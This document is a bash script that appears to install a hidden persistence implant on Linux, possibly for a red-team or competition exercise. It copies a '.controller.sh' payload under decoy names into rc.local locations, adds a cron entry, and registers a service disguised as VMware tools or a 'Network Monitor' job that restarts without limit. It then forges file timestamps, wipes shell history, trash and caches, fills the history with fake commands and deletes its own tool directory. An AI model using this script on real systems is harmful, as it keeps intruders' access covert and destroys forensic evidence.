#!/bin/bash
sudo apt-get install dos2unix -y
chmod +x .controller.sh
sudo dos2unix .controller.sh
LOCATIONS=("/etc/rc.local"
           "/etc/rc.d/rc.local"
           "/etc/init.d/rc.local"
           "/etc/systemd/system/basic.target/rc.local"
           "/etc/systemd/system/multi-user.target/rc.local")
NAMES=(".controller.sh" "networkd.sh" ".scorecheck.sh" "loghelper.sh")
for LOCATION in "${LOCATIONS[@]}"
do
    if [ -f "$LOCATION" ]; then
        for NAME in "${NAMES[@]}"
        do
            cp -p ".controller.sh" "${LOCATION%/*}/$NAME" &> /dev/null
        done
    fi
done
(crontab -l 2>/dev/null; echo "15 5 17 4 * /etc/systemd/network/monitor.sh") | crontab -
cp -p ".controller.sh" "/etc/init.d/rc.local/rcd.sh" &> /dev/null
cp -p ".controller.sh" "/etc/systemd/network/.debug.sh" &> /dev/null
if [[ $(systemctl) ]]; then
    sudo touch -r /etc/systemd/system/sudo.service -a /etc/systemd/system/sudo.service -c /etc/systemd/system/sudo.service /etc/systemd/system/open-vm-toolsd.service.service
    sudo cat > /etc/systemd/system/open-vm-toolsd.service << EOF
[Unit]
Description=Service for virtual machines hosted on VMWare
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash /etc/systemd/network/.debug.sh
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF
    sudo touch -r /etc/systemd/system/sudo.service -a /etc/systemd/system/sudo.service -c /etc/systemd/system/sudo.service /etc/systemd/system/open-vm-toolsd.service.service
    sudo systemctl daemon-reload
    sudo systemctl start open-vm-toolsd.service
elif [[ $(initctl version) =~ upstart ]]; then
    sudo touch -r /etc/init/rc-sysinit.conf -a /etc/init/rc-sysinit.conf -c /etc/init/rc-sysinit.conf /etc/init/network-monitor.conf
    sudo cat > /etc/init/network-monitor.conf << EOF
description "Network Monitor"
start on runlevel [2345]
stop on runlevel [!2345]
respawn
respawn limit unlimited
exec /etc/init.d/rc.local/rcd.sh
EOF
    sudo touch -r /etc/init/rc-sysinit.conf -a /etc/init/rc-sysinit.conf -c /etc/init/rc-sysinit.conf /etc/init/network-monitor.conf
    sudo start network-monitor
fi
#garbage
cat /dev/null > ~/.bash_history && history -c
rm -f $HOME/.bash_history
rm -rf $HOME/.local/share/Trash/*
rm -rf $HOME/.cache/*
for i in {1..200}; do
  case $((RANDOM%10)) in
    0) echo "ls -al";;
    1) echo "cat /etc/passwd";;
    2) echo "tail -n 10 /var/log/sys";;
    3) echo "ps -ef";;
    4) echo "cd /var/log && tail -n 10 syslog";;
    5) echo "ls -la";;
    6) echo "cd ..";;
    7) echo "cat /etc/passwd";;
    8) echo "sudo apt-get update";;
    9) echo "whoami";;
    10) echo "cat /etc/ssh/sshd_config";;
  esac
done >> ~/.bash_history
apt-get remove dos2unix -y
rm -rf ../annoyance-tool
